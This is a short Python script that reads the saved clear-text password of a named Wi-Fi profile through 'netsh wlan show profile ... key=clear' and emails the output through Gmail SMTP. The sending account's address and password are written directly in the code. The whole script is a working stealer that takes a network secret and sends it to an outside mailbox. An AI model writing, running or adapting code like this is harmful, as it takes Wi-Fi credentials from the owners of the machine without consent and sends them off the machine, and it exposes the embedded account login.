import subprocess,smtplib

def mail(email,passw,msg):
	s=smtplib.SMTP("smtp.gmail.com",587)
	s.starttls()
	s.login(email,passw)
	s.sendmail(email,email,msg)
	s.quit()




co="netsh wlan show profile OPPO F11 key=clear"

x=subprocess.check_output(co,shell=True)

mail('cyberbot1502@gmail.com','Hexadecimalqwertyuiop',x)
